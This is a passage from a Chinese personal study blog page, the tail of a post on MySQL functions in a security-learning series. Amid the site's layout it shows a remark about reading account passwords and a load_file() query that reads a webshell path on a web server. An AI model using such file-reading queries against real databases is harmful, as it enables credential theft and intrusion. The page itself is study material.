+<pre><code>读取账号密码,最好在页面有回显时利用,不然就费老劲了
+
+ load_file()
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(&apos;/var/www/html/webshell.php&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="安全规范"><a href="#安全规范" class="headerlink" title="安全规范"></a>安全规范</h2><ul>
+<li>不多举例了 详见PDF《安全指导手册》<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2></li>
+<li><p><strong>Some love stories aren’t epic novels. Some are short stories, but that doesn’t make them any less filled with love.</strong></p>
+</li>
+<li><p>有些爱情故事不会成为史诗，有些只是短篇小说，但同样都满溢着爱。</p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/09/认识网络/" rel="next" title="认识网络">
+                <i class="fa fa-chevron-left"></i> 认识网络
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/11/ORACLE数据库注入及防御/" rel="prev" title="Oracle学习">
+                Oracle学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="zoukba">
+            
+              <p class="site-author-name" itemprop="name">zoukba</p>
+              <p class="site-description motion-element" itemprop="description">阿里我来了</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第五节：mysql学习"><span class="nav-number">1.</span> <span class="nav-text">第五节：mysql学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础练习"><span class="nav-number">1.1.</span> <span class="nav-text">基础练习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#函数"><span class="nav-number">1.1.1.</span> <span class="nav-text">函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用函数"><span class="nav-number">1.2.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全规范"><span class="nav-number">1.3.</span> <span class="nav-text">安全规范</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zoukba</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.6.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.6.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.6.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+  <script src="/js/src/js.cookie.js?v=6.6.0"></script>
+  <script src="/js/src/scroll-cookie.js?v=6.6.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
